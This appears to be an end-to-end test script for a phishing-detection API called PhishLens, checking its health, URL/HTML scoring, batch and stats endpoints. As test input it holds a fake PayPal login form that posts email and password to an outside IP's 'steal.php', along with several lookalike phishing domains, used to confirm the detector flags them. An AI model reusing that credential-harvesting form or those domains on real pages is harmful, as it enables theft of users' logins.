"""
End-to-End API Server Test Suite
---------------------------------
Tests:
  1. GET /health
  2. POST /check (Legitimate URL + HTML)
  3. POST /check (Phishing URL + HTML)
  4. POST /check (URL only fallback)
  5. POST /check/batch
  6. GET /stats/summary
"""

import sys
sys.path.insert(0, "backend")

import json
from app import app

client = app.test_client()

print("=" * 80)
print("RUNNING PHISHLENS API SERVER END-TO-END TEST SUITE")
print("=" * 80)

# 1. Health check
res = client.get("/health")
print(f"\n1. GET /health -> Status: {res.status_code}")
print("  Response:", res.get_json())
assert res.status_code == 200

# 2. Check Legitimate Site
h_google = "\n".join(["<!DOCTYPE html>", "<html>", "<head><title>Google Search</title></head>", "<body><h1>Google</h1>"] + ["<div><a href='/help'>Help</a></div>"] * 500 + ["<form action='/search'><input name='q'/><input type='submit'/></form></body></html>"])
payload_legit = {
    "url": "https://www.google.com/search?q=cybersecurity",
    "html": h_google,
}
res = client.post("/check", json=payload_legit)
print(f"\n2. POST /check (Legitimate Google) -> Status: {res.status_code}")
data_legit = res.get_json()
print(f"  Risk Score: {data_legit['risk_score']} | Level: {data_legit['risk_level']}")
print(f"  Category Scores: {data_legit['category_scores']}")
print(f"  Trust Signals: {data_legit.get('trust_signals', {})}")
assert res.status_code == 200
assert data_legit["risk_level"] == "SAFE"

# 3. Check Real Phishing Attack
h_phish = """<!DOCTYPE html><html><head><title>Account Verification</title></head><body><h1>Verify PayPal</h1><form action="http://103.114.163.238/steal.php" method="POST"><input type="text" name="email"/><input type="password" name="pass"/><input type="submit" value="Log In"/></form></body></html>"""
payload_phish = {
    "url": "https://paypal-verify.account-security.xyz/login.php",
    "html": h_phish,
}
res = client.post("/check", json=payload_phish)
print(f"\n3. POST /check (Phishing Attack) -> Status: {res.status_code}")
data_phish = res.get_json()
print(f"  Risk Score: {data_phish['risk_score']} | Level: {data_phish['risk_level']}")
print(f"  Brand Target: {data_phish.get('brand_target')}")
print(f"  Category Scores: {data_phish['category_scores']}")
print(f"  Reasons: {data_phish['reasons']}")
assert res.status_code == 200
assert data_phish["risk_level"] == "DANGEROUS"

# 4. Check URL Only Fallback
payload_url_only = {
    "url": "https://secure-login.apple.com.account-update.club/verify",
}
res = client.post("/check", json=payload_url_only)
print(f"\n4. POST /check (URL Only Fallback) -> Status: {res.status_code}")
data_url = res.get_json()
print(f"  Risk Score: {data_url['risk_score']} | Level: {data_url['risk_level']}")
print(f"  Category Scores: {data_url['category_scores']}")
assert res.status_code == 200
assert data_url["risk_level"] in ("SUSPICIOUS", "DANGEROUS")

# 5. Batch Scan
batch_payload = {
    "urls": [
        "https://www.github.com",
        "https://www.wikipedia.org",
        "http://free-crypto-giveaway-binance.top/claim.php",
    ]
}
res = client.post("/check/batch", json=batch_payload)
print(f"\n5. POST /check/batch -> Status: {res.status_code}")
data_batch = res.get_json()
print(f"  Scanned count: {data_batch['count']}")
for item in data_batch["results"]:
    print(f"    - {item['url'][:45]} -> {item['risk_score']} ({item['risk_level']})")
assert res.status_code == 200

# 6. Stats & Trends
res = client.get("/stats")
print(f"\n6. GET /stats -> Status: {res.status_code}")
print("  Summary:", res.get_json())
assert res.status_code == 200

res = client.get("/stats/trend")
print(f"\n7. GET /stats/trend -> Status: {res.status_code}")
print("  Trend (24h):", res.get_json())
assert res.status_code == 200


print("\n" + "=" * 80)
print("ALL API END-TO-END TESTS PASSED SUCCESSFULLY! (100% SUCCESS)")
print("=" * 80)
